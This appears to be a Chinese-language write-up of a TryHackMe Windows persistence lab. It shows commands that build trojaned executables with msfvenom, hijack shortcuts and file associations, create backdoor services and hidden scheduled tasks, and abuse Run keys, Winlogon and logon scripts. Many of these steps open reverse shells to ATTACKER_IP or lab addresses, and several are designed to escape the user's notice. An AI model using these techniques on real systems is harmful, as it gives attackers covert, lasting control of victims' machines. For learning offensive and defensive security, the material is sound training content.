<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">a</span> x64 <span class="hljs-attr">--platform</span> windows -x putty<span class="hljs-selector-class">.exe</span> -k -<span class="hljs-selector-tag">p</span> windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> "\x00" -f exe -o puttyX<span class="hljs-selector-class">.exe</span></code></pre>
<p>生成的 puttyX.exe 将在用户没有注意到的情况下执行reverse_tcp meterpreter有效负载。虽然这种方法足以建立持久性，但让我们看看其他更狡猾的技术。</p>
<h3 id="快捷方式文件">快捷方式文件</h3>
<p>如果我们不想修改可执行文件，我们总是可以篡改快捷方式文件本身。与其直接指向预期的可执行文件，我们可以将其更改为指向一个脚本，该脚本将运行一个后门，然后正常执行通常的程序。</p>
<p>对于此任务，让我们检查管理员桌面上的 calc 快捷方式。如果我们右键单击它并转到属性，我们将看到它指向的位置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206134717487.png" alt="image-20240206134717487"></p>
<p>在劫持快捷方式的目标之前，让我们在 <code>C:\Windows\System32</code> 或任何其他隐蔽位置创建一个简单的 Powershell 脚本。该脚本将执行反向 shell，然后从快捷方式属性上的原始位置运行 calc.exe：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-NoNewWindow</span> <span class="hljs-string">"c:\tools\nc64.exe"</span> <span class="hljs-string">"-e cmd.exe ATTACKER_IP 4445"</span>

C:\Windows\System32\calc.exe</code></pre>
<p>最后，我们将更改快捷方式以指向我们的脚本。请注意，执行此操作时，快捷方式的图标可能会自动调整。请务必将图标指向原始可执行文件，以便用户不会看到任何可见的更改。我们还想在隐藏窗口上运行脚本，为此我们将 <code>-windowstyle hidden</code> 选项添加到 Powershell。快捷方式的最终目标是：</p>
<pre><code class="hljs scss">powershell<span class="hljs-selector-class">.exe</span> -WindowStyle hidden C:\Windows\System32\backdoor.ps1</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206140410061.png" alt="image-20240206140410061"></p>
<p>让我们启动一个 nc 监听器来接收攻击者机器上的反向 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ nc -lvp <span class="hljs-number">4445</span></code></pre>
<p>如果双击该快捷方式，您应该会获得与攻击者计算机的连接。同时，用户将得到一个正如他们所期望的计算器。您可能会注意到命令提示符在屏幕上闪烁并立即消失。希望普通用户可能不会太介意这一点。</p>
<h3 id="劫持文件关联">劫持文件关联</h3>
<p>除了通过可执行文件或快捷方式进行持久化之外，我们还可以劫持任何文件关联，以强制操作系统在用户打开特定文件类型时运行 shell。</p>
<p>默认操作系统文件关联保存在注册表内，其中 <code>HKLM\Software\Classes\</code> 下为每个文件类型存储一个密钥。假设我们要检查使用哪个程序打开 .txt 文件；我们可以检查 <code>.txt</code> 子项并找到与其关联的程序 ID (ProgID)。 ProgID 只是系统上安装的程序的标识符。对于 .txt 文件，我们将具有以下 ProgID：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206141444268.png" alt="image-20240206141444268"></p>
<p>然后，我们可以搜索相应 ProgID 的子项（也在 <code>HKLM\Software\Classes\</code> 下），在本例中为 <code>txtfile</code> ，我们将在其中找到负责处理 .txt 的程序的引用文件。大多数 ProgID 条目在 <code>shell\open\command</code> 下都有一个子项，其中指定了对具有该扩展名的文件运行的默认命令：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206141452822.png" alt="image-20240206141452822"></p>
<p>在这种情况下，当您尝试打开 .txt 文件时，系统将执行 <code>%SystemRoot%\system32\NOTEPAD.EXE %1</code> ，其中 <code>%1</code> 表示打开的文件的名称。如果我们想劫持这个扩展，我们可以用执行后门的脚本替换命令，然后像往常一样打开文件。首先，我们创建一个包含以下内容的 ps1 脚本并将其保存到 <code>C:\Windows\backdoor2.ps1</code> ：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Start-Process</span> <span class="hljs-literal">-NoNewWindow</span> <span class="hljs-string">"c:\tools\nc64.exe"</span> <span class="hljs-string">"-e cmd.exe ATTACKER_IP 4448"</span>
C:\Windows\system32\NOTEPAD.EXE <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>]</code></pre>
<p>请注意，在 Powershell 中，我们必须将 <code>$args[0]</code> 传递给记事本，因为它将包含要打开的文件的名称，如通过 <code>%1</code> 给出的那样。</p>
<p>现在让我们更改注册表项以在隐藏窗口中运行后门脚本：</p>
<pre><code class="hljs SCSS">powershell -WindowStyle hidden C:\Windows\System32\backdoor.ps1 %<span class="hljs-number">1</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206141525504.png" alt="image-20240206141525504"></p>
<p>最后，为反向 shell 创建一个侦听器，并尝试打开受害计算机上的任何 .txt 文件（如果需要，请创建一个）。您应该会收到一个具有打开该文件的用户权限的反向 shell。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206141710290.png" alt="image-20240206141710290"></p>
<p>这里建了个1.txt然后双击执行，即可拿shell</p>
<h2 id="23-滥用服务">2.3 滥用服务</h2>
<p>Windows 服务提供了一种建立持久性的好方法，因为它们可以配置为在受害计算机启动时在后台运行。如果我们可以利用任何服务为我们运行某些东西，我们就可以在每次启动时重新获得对受害计算机的控制。</p>
<p>服务基本上是在后台运行的可执行文件。配置服务时，您可以定义将使用哪个可执行文件，并选择该服务是在计算机启动时自动运行还是应该手动启动。</p>
<p>我们可以通过两种主要方式滥用服务来建立持久性：创建一项新服务或修改现有服务来执行我们的有效负载。</p>
<h3 id="创建后门服务">创建后门服务</h3>
<p>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p>
<pre><code class="hljs scss">sc<span class="hljs-selector-class">.exe</span> create THMservice binPath= "net user Administrator Passwd123" start= auto
sc<span class="hljs-selector-class">.exe</span> start THMservice</code></pre>
<p><strong>Note:</strong> There must be a space after each equal sign for the command to work.<br>
注意：每个等号后面必须有一个空格才能使该命令起作用。</p>
<p>服务启动时将执行“net user”命令，将管理员密码重置为 <code>Passwd123</code> 。请注意该服务如何设置为自动启动 (start= auto)，以便它无需用户交互即可运行。</p>
<p>重置用户密码效果很好，但我们还可以使用 msfvenom 创建一个反向 shell，并将其与创建的服务关联起来。但请注意，服务可执行文件是唯一的，因为它们需要实现由系统处理的特定协议。如果要创建与Windows服务兼容的可执行文件，可以在msfvenom中使用 <code>exe-service</code> 格式：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4448</span> -f exe-service -o rev-svc.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206154054886.png" alt="image-20240206154054886"></p>
<p>之后在受害机上的powershell下载上述exe</p>
<pre><code class="hljs scss">wget http://<span class="hljs-number">10.10</span>.<span class="hljs-number">51.167</span>:<span class="hljs-number">8000</span>/rev-svc.exe -O rev-svc.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206154124187.png" alt="image-20240206154124187"></p>
<p>然后，您可以将可执行文件复制到目标系统，例如 <code>C:\Windows</code> （这里我是\Users\Administrator）并将服务的 binPath 指向它：（在powershell执行）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206154506206.png" alt="image-20240206154506206"></p>
<pre><code class="hljs scss">sc<span class="hljs-selector-class">.exe</span> create THMservice2 binPath= "C:\Users\Administrator\rev-svc.exe<span class="hljs-string">" start= auto</span>
<span class="hljs-string">sc.exe start THMservice2</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206154335493.png" alt="image-20240206154335493"></p>
<p>这应该会创建一个返回到攻击者计算机的连接。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206154455553.png" alt="image-20240206154455553"></p>
<h3 id="修改现有服务">修改现有服务</h3>
<p>虽然为持久性创建新服务效果很好，但蓝队可能会监控整个网络上的新服务创建。我们可能希望重用现有服务而不是创建服务来避免检测。通常，任何禁用的服务都是一个很好的候选者，因为它可以在用户没有注意到的情况下进行更改。</p>
<p>您可以使用以下命令获取可用服务的列表：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206154647912.png" alt="image-20240206154647912"></p>
<p>可以看到有很多，这里放一个简单模板</p>
<pre><code class="hljs scss">C:\&gt; sc query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        STATE              : <span class="hljs-number">1</span>  STOPPED
        WIN32_EXIT_CODE    : <span class="hljs-number">1077</span>  (<span class="hljs-number">0</span>x435)
        SERVICE_EXIT_CODE  : <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        CHECKPOINT         : <span class="hljs-number">0</span>x0
        WAIT_HINT          : <span class="hljs-number">0</span>x0</code></pre>
<p>您应该能够找到名为 THMService3 的已停止服务。要查询服务的配置，可以使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; sc qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        START_TYPE         : <span class="hljs-number">2</span> AUTO_START
        ERROR_CONTROL      : <span class="hljs-number">1</span>   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : <span class="hljs-number">0</span>
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service</code></pre>
<p>使用服务进行持久化时，我们关心三件事：</p>
<ul>
<li>可执行文件（BINARY_PATH_NAME）应该指向我们的有效负载。</li>
<li>服务 START_TYPE 应该是自动的，以便有效负载无需用户交互即可运行。</li>
<li>SERVICE_START_NAME 是运行服务的帐户，最好将其设置为 LocalSystem 以获取 SYSTEM 权限。</li>
</ul>
<p>让我们首先使用 msfvenom 创建一个新的反向 shell：（这里我就用旧的了）</p>
<p>要重新配置“THMservice3”参数，我们可以使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; sc config THMservice3 binPath= <span class="hljs-string">"C:\Windows\rev-svc2.exe"</span> start= auto obj= <span class="hljs-string">"LocalSystem"</span></code></pre>
<p>然后，您可以再次查询服务的配置以检查是否一切按预期进行：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206154925628.png" alt="image-20240206154925628"></p>
<p>那我们直接启动该服务即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206155346344.png" alt="image-20240206155346344"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206155357649.png" alt="image-20240206155357649"></p>
<h2 id="24-滥用计划任务">2.4 滥用计划任务</h2>
<p>如果需要，我们还可以使用计划任务来建立持久性。有多种方法可以在 Windows 系统中安排有效负载的执行。让我们看看其中的一些：</p>
<h3 id="任务调度程序">任务调度程序</h3>
<p>安排任务的最常见方法是使用内置的 Windows 任务计划程序。任务计划程序允许对任务启动时间进行精细控制，允许您配置在特定时间激活、定期重复甚至在发生特定系统事件时触发的任务。在命令行中，您可以使用 <code>schtasks</code> 与任务计划程序交互。该命令的完整参考可以在 Microsoft 网站上找到：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks</a></p>
<p>让我们创建一个每分钟运行一次反向 shell 的任务。在现实场景中，您不希望负载如此频繁地运行，但我们不想在这个房间等待太久：</p>
<pre><code class="hljs scss">C:\&gt; schtasks /create /sc minute /mo <span class="hljs-number">1</span> /tn THM-TaskBackdoor /tr <span class="hljs-string">"c:\tools\nc64 -e cmd.exe 10.10.46.173 5555"</span> /ru SYSTEM
SUCCESS: The scheduled task <span class="hljs-string">"THM-TaskBackdoor"</span> has successfully been created.</code></pre>
<p>注意：请务必使用 <code>THM-TaskBackdoor</code> 作为任务名称，否则您将不会获得该标志。</p>
<p>前面的命令将创建一个“THM-TaskBackdoor”任务并向攻击者执行 <code>nc64</code> 反向 shell。 <code>/sc</code> 和 <code>/mo</code> 选项指示任务应每分钟运行一次。 <code>/ru</code> 选项指示该任务将以 SYSTEM 权限运行。</p>
<p>要检查我们的任务是否已成功创建，我们可以使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         <span class="hljs-number">5</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">08</span>:<span class="hljs-number">00</span> AM   Ready</code></pre>
<h3 id="让我们的任务隐形">让我们的任务隐形</h3>
<p>我们的任务现在应该已经启动并运行，但是如果受感染的用户尝试列出其计划任务，我们的后门将会很明显。为了进一步隐藏我们的计划任务，我们可以通过删除其安全描述符（SD）使其对系统中的任何用户都不可见。安全描述符只是一个 ACL，它说明哪些用户有权访问计划任务。如果您的用户不允许查询计划任务，您将无法再看到它，因为 Windows 只会向您显示您有权使用的任务。删除SD相当于禁止所有用户访问计划任务，包括管理员。</p>
<p>所有计划任务的安全描述符都存储在 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code> 中。您将找到每个任务的注册表项，其中名为“SD”的值包含安全描述符。仅当您拥有 SYSTEM 权限时才能删除该值。</p>
<p>为了隐藏我们的任务，让我们删除之前创建的“THM-TaskBackdoor”任务的 SD 值。为此，我们将使用 <code>psexec</code> （在 <code>C:\tools</code> 中提供）以系统权限打开 Regedit：</p>
<pre><code class="hljs scss">C:\&gt; c:\tools\pstools\PsExec64.exe -s -i regedit</code></pre>
<p>然后我们将删除任务的安全描述符：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206160323530.png" alt="image-20240206160323530"></p>
<p>如果我们尝试再次查询我们的服务，系统会告诉我们没有这样的任务：</p>
<pre><code class="hljs scss">C:\&gt; schtasks /query /tn thm-taskbackdoor 
ERROR: The system cannot find the file specified.</code></pre>
<p>如果我们在攻击者的机器上启动一个 nc 监听器，我们应该会在一分钟后得到一个 shell：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206162241913.png" alt="image-20240206162241913"></p>
<h2 id="25-登录触发持久化">2.5 登录触发持久化</h2>
<p>用户执行的某些操作也可能绑定到执行特定的有效负载以实现持久性。 Windows 操作系统提供了多种将有效负载与特定交互相关联的方法。此任务将研究植入有效负载的方法，这些有效负载将在用户登录系统时执行。</p>
<h3 id="启动文件夹">启动文件夹</h3>
<p>每个用户在 <code>C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 下都有一个文件夹，您可以在其中放置要在用户登录时运行的可执行文件。攻击者只需将有效负载放入其中即可实现持久性。请注意，每个用户只会运行其文件夹中可用的内容。</p>
<p>如果我们想强制所有用户在登录时运行有效负载，我们可以以相同的方式使用 <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 下的文件夹。</p>
<p>对于此任务，让我们使用 msfvenom 生成反向 shell 有效负载：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">46.173</span> LPORT=<span class="hljs-number">5555</span> -f exe -o revshell.exe</code></pre>
<p>然后我们将把有效负载复制到受害者机器中。您可以使用 Python3 生成 <code>http.server</code> 并在受害计算机上使用 wget 来提取文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206162952014.png" alt="image-20240206162952014"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206162945621.png" alt="image-20240206162945621"></p>
<p>然后，我们将有效负载存储到 <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 文件夹中，以便为登录计算机的任何用户获取 shell。</p>
<pre><code class="hljs scss">C:\&gt; copy revshell.exe <span class="hljs-string">"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"</span></code></pre>
<p>现在请务必从开始菜单注销您的会话（关闭 RDP 窗口还不够，因为它会使您的会话保持打开状态）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206164715241.png" alt="image-20240206164715241"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206164724436.png" alt="image-20240206164724436"></p>
<h3 id="run-runonce">Run / RunOnce</h3>
<p>您还可以通过注册表强制用户在登录时执行程序。您可以使用以下注册表项来指定在登录时运行的应用程序，而不是将有效负载传递到特定目录：</p>
<ul>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
</ul>
<p><code>HKCU</code> 下的注册表项仅适用于当前用户， <code>HKLM</code> 下的注册表项适用于所有人。在 <code>Run</code> 键下指定的任何程序都将在用户每次登录时运行。 <code>RunOnce</code> 键下指定的程序将仅执行一次。</p>
<p>对于此任务，让我们使用 msfvenom 创建一个新的反向 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4451</span> -f exe -o revshell.exe</code></pre>
<p>将其传输到受害机器后，让我们将其移动到 <code>C:\Windows\</code> ：</p>
<pre><code class="hljs scss">C:\&gt; move revshell.exe C:\Windows</code></pre>
<p>然后，我们在 <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code> 下创建一个 <code>REG_EXPAND_SZ</code> 注册表项。条目的名称可以是您喜欢的任何内容，值将是我们要执行的命令。</p>
<p>注意：在实际环境中，您可以为注册表项使用任何名称，但对于此任务，您需要使用 <code>MyBackdoor</code> 来接收标志。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206165915876.png" alt="image-20240206165915876"></p>
<p>完成此操作后，退出当前会话并再次登录，您应该会收到一个 shell（可能需要大约 10-20 秒）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206170033593.png" alt="image-20240206170033593"></p>
<h3 id="登录系统">登录系统</h3>
<p>登录时自动启动程序的另一种替代方法是滥用 Winlogon，这是一种 Windows 组件，可在身份验证（除其他外）后立即加载您的用户配置文件。</p>
<p>Winlogon 在 <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> 下使用一些注册表项，这对于获得持久性可能很有趣：</p>
<ul>
<li><code>Userinit</code> 指向 <code>userinit.exe</code> ，它负责恢复您的用户配置文件首选项。</li>
<li><code>shell</code> 指向系统的 shell，通常是 <code>explorer.exe</code> 。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206170242352.png" alt="image-20240206170242352"></p>
<p>如果我们用一些反向 shell 替换任何可执行文件，我们就会破坏登录序列，这是我们所不希望的。有趣的是，您可以附加用逗号分隔的命令，Winlogon 将处理所有命令。</p>
<p>让我们从创建一个 shell 开始：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4452</span> -f exe -o revshell.exe</code></pre>
<p>我们将像之前一样将 shell 转移到受害机器上。然后我们可以将 shell 复制到我们喜欢的任何目录。在这种情况下，我们将使用 <code>C:\Windows</code> ：</p>
<pre><code class="hljs scss">C:\&gt; move revshell.exe C:\Windows</code></pre>
<p>然后我们更改 <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> 中的 <code>shell</code> 或 <code>Userinit</code> 。在本例中，我们将使用 <code>Userinit</code> ，但使用 <code>shell</code> 的过程是相同的。</p>
<p>注意：虽然 <code>shell</code> 和 <code>Userinit</code> 都可用于在现实场景中实现持久性，但要获取此房间中的标志，您将需要使用 <code>Userinit</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206170515077.png" alt="image-20240206170515077"></p>
<h3 id="登录脚本">登录脚本</h3>
<p>加载用户配置文件时 <code>userinit.exe</code> 所做的事情之一是检查名为 <code>UserInitMprLogonScript</code> 的环境变量。我们可以使用此环境变量将登录脚本分配给用户，该脚本将在登录计算机时运行。默认情况下未设置该变量，因此我们可以创建它并分配我们喜欢的任何脚本。</p>
<p>请注意，每个用户都有自己的环境变量；因此，您需要分别为每个用户设置后门。</p>
<p>让我们首先创建一个用于此技术的反向 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4453</span> -f exe -o revshell.exe</code></pre>
<p>我们将像之前一样将 shell 转移到受害机器上。然后我们可以将 shell 复制到我们喜欢的任何目录。在这种情况下，我们将使用 <code>C:\Windows</code> ：</p>
<pre><code class="hljs scss">C:\&gt; move revshell.exe C:\Windows</code></pre>
<p>为用户创建环境变量，您可以转到注册表中的 <code>HKCU\Environment</code> 。我们将使用 <code>UserInitMprLogonScript</code> 条目指向我们的有效负载，以便在用户登录时加载它：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206170856227.png" alt="image-20240206170856227"></p>
<p>请注意，此注册表项在 <code>HKLM</code> 中没有等效项，这使得您的后门仅适用于当前用户。</p>
<p>完成此操作后，退出当前会话并再次登录，您应该会收到一个 shell（可能需要大约 10 秒）。</p>
<h2 id="26-登录屏幕rdp-后门">2.6 登录屏幕/RDP 后门</h2>
<p>如果我们对机器有物理访问权限（在我们的例子中是 RDP），您可以在登录屏幕后门来访问终端，而无需拥有机器的有效凭据。</p>
<p>为此，我们将研究两种依赖辅助功能的方法。</p>
<h3 id="sticky-keys-粘滞键">Sticky Keys 粘滞键</h3>
<p>当按下 <code>CTRL + ALT + DEL</code> 等组合键时，您可以将 Windows 配置为使用粘滞键，这样您就可以按顺序而不是同时按下组合按钮。从这个意义上说，如果粘滞键处于活动状态，您可以按下并释放 <code>CTRL</code> ，按下并释放 <code>ALT</code> ，最后按下并释放 <code>DEL</code> 来实现相同的效果效果与按 <code>CTRL + ALT + DEL</code> 组合键一样。</p>
<p>为了使用粘滞键建立持久性，我们将滥用任何 Windows 安装中默认启用的快捷方式，该快捷方式允许我们通过按 <code>SHIFT</code> 5 次来激活粘滞键。输入快捷方式后，我们通常会看到如下所示的屏幕：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206171506024.png" alt="image-20240206171506024"></p>
<p>按 <code>SHIFT</code> 5 次后，Windows 将执行 <code>C:\Windows\System32\sethc.exe</code> 中的二进制文件。如果我们能够将此类二进制文件替换为我们偏好的有效负载，则我们可以使用快捷方式触发它。有趣的是，我们甚至可以在输入任何凭据之前从登录屏幕执行此操作。</p>
<p>登录屏幕后门的一种简单方法是将 <code>sethc.exe</code> 替换为 <code>cmd.exe</code> 的副本。这样，我们就可以使用粘滞键快捷键生成控制台，甚至可以从日志记录屏幕中生成控制台。</p>
<p>要覆盖 <code>sethc.exe</code> ，我们首先需要获得该文件的所有权并授予当前用户修改它的权限。只有这样我们才能用 <code>cmd.exe</code> 的副本替换它。我们可以使用以下命令来做到这一点：</p>
